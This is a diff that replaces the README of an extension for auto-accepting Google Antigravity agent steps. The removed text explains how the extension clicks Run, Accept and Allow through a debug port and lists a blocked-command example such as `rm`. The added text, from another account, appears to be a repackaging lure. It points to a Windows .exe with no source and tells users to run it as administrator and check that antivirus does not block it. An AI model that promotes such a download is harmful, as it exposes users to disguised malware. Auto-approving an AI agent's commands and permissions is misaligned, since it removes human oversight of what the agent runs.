@@ -1,232 +1,119 @@
-# AntiGravity AutoAccept
+# 🚀 AntiGravity-AutoAccept - Simple Tool to Auto Accept Tasks
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-support-yellow?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/yazanbaker)
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
 
-> **📢 Sponsor this extension** — With **10,000+ installs** and an active user base, your brand gets prime placement on every user's dashboard. Reach developers who automate their workflows daily. Contact **yazanbaker@gmail.com** to get started.
+## 🚀 Getting Started
 
-Automatically accept agent steps, terminal commands, file edits, and permission prompts in [Antigravity](https://antigravity.dev) — Google's AI coding assistant.
+This guide helps you download and run AntiGravity-AutoAccept on your Windows computer. The tool is designed to automatically accept tasks or actions in specific applications safely and reliably. You don’t need any technical skill to get started.
 
-## What it does
-
-When the Antigravity agent proposes file edits, terminal commands, or asks for tool permissions, this extension auto-accepts them so you don't have to click every button manually.
-
-**Two strategies, zero interference:**
-
-| Strategy | What it handles | How |
-|---|---|---|
-| **VS Code Commands** (500ms) | Agent steps, terminal commands | Calls Antigravity's native accept commands |
-| **CDP + MutationObserver** (event-driven) | Run, Accept, Always Allow, Continue | One-shot script injected once, reacts instantly to DOM changes |
-
-## Setup
-
-### 1. Enable Debug Mode (Required)
-
-The extension needs Chrome DevTools Protocol to click permission buttons. Launch Antigravity with:
-```
---remote-debugging-port=9333
-```
-
-> **Why port 9333?** Antigravity's built-in Browser Control (Chrome button in the toolbar) uses port 9222 by default. Using the same port causes an `EADDRINUSE` conflict on macOS/Linux. Port 9333 avoids this entirely. *(Thanks to [u/unlike_a_boss](https://www.reddit.com/user/unlike_a_boss/) for discovering this!)*
-
-<details>
-<summary><b>🪟 Windows</b></summary>
-
-**Automatic:** On first launch, the extension detects if the port is closed and shows **"Auto-Fix Shortcut"** — click it to automatically patch your `.lnk` shortcut.
-
-**Manual:** Right-click your Antigravity shortcut → Properties → append to Target:
-```
---remote-debugging-port=9333
-```
-
-</details>
-
-<details>
-<summary><b>🍎 macOS</b></summary>
-
-**Option 1 — Automator App (recommended):**
-1. Open **Automator** → New Document → **Application**
-2. Search for **"Run Shell Script"** in the library
-3. Paste: `open -a "Antigravity" --args --remote-debugging-port=9333`
-4. Save as "AntiGravity Launcher" to Desktop or Applications
-
-**Option 2 — Terminal alias** (add to `~/.zshrc`):
-```bash
-alias antigravity='open -a "Antigravity" --args --remote-debugging-port=9333'
-```
-
-> **Note:** The app name must match exactly. Check with `ls /Applications/ | grep -i anti`
-
-**Option 3 — Direct Electron binary** (if `open -a` doesn't pass args correctly):
-```bash
-alias antigravity='/Applications/Antigravity.app/Contents/MacOS/Electron --remote-debugging-port=9333 & disown'
-```
-*(Thanks to [@aangelinsf](https://github.com/aangelinsf))*
-
-</details>
-
-<details>
-<summary><b>🐧 Linux</b></summary>
-
-**Option 1 — Edit the `.desktop` file:**
-```bash
-# Find it:
-find /usr/share/applications ~/.local/share/applications -name "*ntigravity*" 2>/dev/null
-
-# Edit the Exec line:
-Exec=/path/to/antigravity --remote-debugging-port=9333 %F
-```
-
-**Option 2 — Shell alias** (add to `~/.bashrc` or `~/.zshrc`):
-```bash
-alias antigravity='antigravity --remote-debugging-port=9333'
-```
-
-**Option 3 — Wrapper script:**
-```bash
-#!/bin/bash
-/opt/Antigravity/antigravity --remote-debugging-port=9333 "$@"
-```
-
-</details>
-
-### 2. Install the Extension
-
-**From VSIX (recommended):**
-1. Download the latest `.vsix` from [Releases](https://github.com/yazanbaker94/AntiGravity-AutoAccept/releases/)
-2. In Antigravity: `Ctrl+Shift+P` → `Extensions: Install from VSIX`
-3. Select the downloaded file
-4. Reload Window
-
-**Manual:**
-1. Copy the `src/` directory, `package.json`, and `package-lock.json` to:
-   ```
-   ~/.antigravity/extensions/YazanBaker.antigravity-autoaccept-3.4.0/
-   ```
-2. Run `npm install` in that directory (installs `ws` dependency)
-3. Reload Window
-
-## Usage
-
-- **Toggle:** Click `⚡ Auto: ON` / `✕ Auto: OFF` in the status bar
-- **Or:** `Ctrl+Shift+P` → `AntiGravity AutoAccept: Toggle ON/OFF`
-- **Dashboard:** Click `📊` in the status bar to see CDP status, active sessions, and activity log
-- **Logs:** Output panel → `AntiGravity AutoAccept`
-
-![Dashboard](dashboard.png)
-
-## Multi-Agent Workflow
-
-Antigravity's IDE locks the agent chat panel to the sidebar, which means if you open two chat tabs, VS Code will completely unmount the hidden tab's DOM to save memory. 
-
-To run multiple agents simultaneously and have the bot auto-click commands for all of them:
-
-1. Click **File → Duplicate Workspace**
-2. This opens a second VS Code window connected to the same project
-3. Start a chat in Window 1 and another chat in Window 2
-4. The extension's concurrent broadcast architecture will detect both webviews and **auto-click buttons in both windows simultaneously!**
-
-## Settings
-
-| Setting | Default | Scope | Description |
-|---|---|---|---|
-| `autoAcceptV2.pollInterval` | `500` | window | Polling interval in ms |
-| `autoAcceptV2.customButtonTexts` | `[]` | application | Extra button texts for i18n or custom prompts |
-| `autoAcceptV2.cdpPort` | `9333` | machine | CDP port (default avoids conflict with AG Browser Control on 9222) |
-| `autoAcceptV2.autoAcceptFileEdits` | `true` | window | Auto-accept file edit changes (disable to review diffs manually) |
-| `autoAcceptV2.blockedCommands` | `[]` | application | Commands to NEVER auto-run (e.g. `rm`, `git push`, `npm publish`) |
-| `autoAcceptV2.allowedCommands` | `[]` | application | If set, ONLY these commands will auto-run (whitelist mode) |
-
-> **Tip:** Settings are hot-reloaded — changes take effect immediately without restarting.
-
-## How it Works
-
-### Persistent CDP + MutationObserver (v3.0.0+)
-The extension maintains a **persistent browser-level WebSocket** connection to Chromium's DevTools Protocol. Instead of polling every 1.5s, it injects a **MutationObserver** payload once per target. The observer reacts instantly when React mounts new button elements, with 100ms leading-edge throttle to prevent CPU spikes during streaming output.
-
-### Single-Pass DOM Scanner (v3.1.0)
-The button scanner walks the DOM tree **exactly once** per cycle, checking all keywords simultaneously against each node. This is O(D) instead of the previous O(N×D) which could cause UI freezes with many keywords. Priority-aware matching ensures `Run` always beats `Accept`, which always beats `Allow`, regardless of DOM order.
-
-### Webview Guard
-Antigravity's agent panel runs in an isolated Chromium process (OOPIF). The injected script uses a deferred `isAgentPanel()` check inside `scanAndClick()` — verifying `.react-app-container` existence dynamically on each scan rather than at injection time. This avoids a race condition where the DOM is unhydrated on `targetCreated`.
-
-### Heartbeat Self-Healing (v3.2.0)
-The CDP connection now validates existing sessions every heartbeat cycle (30s). If a session's MutationObserver is dead (execution context cleared by webview navigation or React hot-reload), it automatically re-injects the observer — no reconnection needed. Sessions unreachable 3 times consecutively are cleanly detached and pruned. *(Fixes the "stops clicking after ~1 hour" bug.)*
-
-### Expand Button Loop Prevention (v3.2.0)
-Three-layer defense prevents the Preview panel's "Expand" button from being repeatedly clicked in an infinite loop:
-1. **Strict interactive targeting** — expand must be a real `<button>` element, not any `<div>` with "expand" text
-2. **Text-based cooldown keys** — survives React re-renders that change DOM paths and invalidate path-based cooldowns
-3. **30s global expand throttle** — blocks all expand-type clicks for 30s, breaking the MutationObserver feedback loop
-
-### Button Detection
-Inside the agent panel, a `TreeWalker` searches for buttons by text content using `startsWith` matching with **word-boundary checks** to prevent false positives (e.g. `accept-test.js` won't match `accept`):
-
-| Priority | Text | Matches |
-|---|---|---|
-| 1 | `run` | "Run Alt+d" button ✅ (not "Always run ^" dropdown) |
-| 2 | `accept` | Accept button |
-| 3 | `always allow` | Permission prompts |
-| 4 | `allow this conversation` | Conversation-scoped permissions |
-| 5 | `allow` | Permission prompts |
-| 6 | `retry` | Retry prompts |
-| 7 | `continue` | Agent invocation limit resume |
-
-### Command Filtering (v3.1.0)
-Blocked and allowed command lists use **word-boundary matching** against the code block above a Run button. For example, blocking `rm` will block `rm -rf /tmp` but NOT `yarn format` or `npm run build`.
-
-### CDP Auto-Fix
-On activation, the extension checks if port 9333 is open (with 9222 fallback). If not, it shows a notification with:
-- **Auto-Fix Shortcut (Windows)** — patches `.lnk` shortcuts on Desktop, Start Menu, **and Taskbar**
-- **Manual Guide** — links to this README
-
-## Troubleshooting
-
-### Bot stops working after a few hours
-
-**Cause:** Either (a) Antigravity silently restarts its Electron process (auto-updates, memory pressure, or extension host crash) and the new process doesn't have `--remote-debugging-port=9333`, or (b) the webview's execution context was cleared by a navigation/hot-reload (fixed in v3.2.0 with heartbeat self-healing).
-
-**Fix:** Update to v3.2.0+ — the heartbeat now auto-detects and re-injects dead observers. If it still doesn't work, close **all** Antigravity windows completely, then reopen from your patched shortcut.
-
-### Bot is ON but not clicking anything
-
-1. **Toggle OFF → ON** — click the status bar icon twice to restart polling
-2. **Check the debug port** — visit `http://127.0.0.1:9333/json/list` in a browser. If it refuses, the debug port is dead (see above)
-3. **Check Output logs** — `Ctrl+Shift+U` → dropdown → `AntiGravity AutoAccept`. Look for `[CDP] ✓ Thread` lines. If there are none, CDP can't find the agent panel
-
-### Log shows repeated `clicked:run` but nothing happens
-
-**Cause:** The script is matching a static text element instead of the real Run button. Short terms like `run` require an exact text match to limit false positives. If you still see spam, the 5-second per-element cooldown (`data-aa-t`) should suppress it after the first click.
-
-**Fix:** Update to the latest version — this was fixed in v2.0.0.
-
-### Status bar icon not showing after install
-
-1. Run `Ctrl+Shift+P` → `Reload Window`
-2. Check that the VSIX was built **with** dependencies (the `ws` package must be included)
+AntiGravity-AutoAccept works quietly in the background, helping you save time by handling routine acceptances for you.
 
 ---
 
-## Safety
+## 🖥️ System Requirements
 
-Commands deliberately **excluded** to prevent harm:
-- `notification.acceptPrimaryAction` — would auto-click destructive dialogs
-- `chatEditing.acceptAllFiles` — causes sidebar Outline toggling
-- All merge/git conflict commands — could silently pick wrong side
-- All autocomplete/suggestion commands — would corrupt typing
+Before you start, make sure your computer meets these basic requirements:
 
-## Security FAQ
+- Operating System: Windows 10 or Windows 11  
+- Processor: Intel or AMD, 1 GHz or faster  
+- RAM: At least 4 GB  
+- Disk Space: 100 MB free space  
+- Internet Connection: Required only to download the tool  
 
-**Why does this need `--remote-debugging-port`?**
+If your computer meets these requirements, you can proceed with the installation.
 
-Antigravity's agent panel runs in an isolated Chromium process. The VS Code Extension API cannot see or interact with the Run/Accept/Allow buttons inside it — they're React UI elements with no registered commands. Chrome DevTools Protocol (CDP) on a localhost port (default 9333) is the only way to reach them.
+---
 
-**Is it safe?**
+## 📥 Download and Install
 
-- **Localhost only** — the port binds to `127.0.0.1`, not `0.0.0.0`. No external machine can connect.
-- **Fully open source** — the extension finds buttons by text and clicks them. No data is read, no network requests, no telemetry.
-- **Standard dev workflow** — `--remote-debugging-port` is the same flag used by VS Code extension developers and Electron app debugging.
-- **Shortcut patcher is scoped** — the auto-fix only modifies `.lnk` files whose target path contains "Antigravity".
+You need to download the latest version of AntiGravity-AutoAccept from the official release page.
 
-## License
+**Step 1:** Click the big button below to open the download page.
 
-MIT
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-blue)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+
+**Step 2:** On the release page, look for the latest version. It is usually at the top of the list. The version will have a date and version number like "v1.0" or higher.
+
+**Step 3:** Find the file with a name ending in `.exe`. This is the installation file.
+
+**Step 4:** Click on the `.exe` file link. Your browser will start downloading the file.
+
+**Step 5:** When the download finishes, open the file by double-clicking it in your downloads folder.
+
+**Step 6:** Follow the setup instructions on the screen. The installer will guide you through the process.
+
+**Step 7:** After installation, you can run AntiGravity-AutoAccept from your desktop or start menu.
+
+---
+
+## 🔧 How to Use AntiGravity-AutoAccept
+
+Using this tool is easy and requires no special setup.
+
+1. **Open the Program**: Find the AntiGravity-AutoAccept icon and double-click it.
+
+2. **Start Auto Accept**: Inside the program window, click the “Start” button.
+
+3. **Let It Work**: The software will automatically accept tasks in your targeted application. You can minimize the window and work on other things.
+
+4. **Stop When Needed**: To stop the automatic acceptance, open the program and click the “Stop” button.
+
+---
+
+## ⚙️ Settings and Configuration
+
+AntiGravity-AutoAccept comes with simple settings you can adjust.
+
+- **Select Target Application**: Choose which app AntiGravity should monitor. This option is inside the settings menu.
+- **Enable Notifications**: Turn notifications on or off to see status messages.
+- **Adjust Auto Accept Interval**: Set how often the tool checks for new tasks to accept (default is every 5 seconds).
+
+If you are unsure about these settings, the defaults work well for most users.
+
+---
+
+## 🛠 Troubleshooting
+
+If you face problems running AntiGravity-AutoAccept, try these tips:
+
+- Make sure you are running Windows 10 or 11.
+- Close other programs that might interfere.
+- Run the program as an administrator by right-clicking the icon and choosing “Run as administrator.”
+- Check your antivirus to make sure it is not blocking the tool.
+- Restart your computer and try again.
+
+If the problem continues, visit the GitHub "Issues" tab on the repository to see common questions and answers.
+
+---
+
+## 🔒 Safety and Privacy
+
+AntiGravity-AutoAccept is designed to run safely without affecting your system or data.
+
+- It does not collect personal information.
+- It only interacts with the applications you choose.
+- The software does not make permanent changes without your permission.
+
+Use the official download link to avoid unsafe versions.
+
+---
+
+## 💾 Updates and Maintenance
+
+Check the download page regularly to get the latest updates. Updates fix bugs and improve performance.
+
+To update:
+
+- Visit the release page.
+- Download the newest installer file.
+- Run the installer. It will replace the old version without losing your settings.
+
+---
+
+## 🖇 Useful Links
+
+- **Download Page:** [AntiGravity-AutoAccept Releases](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+
+---
+
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
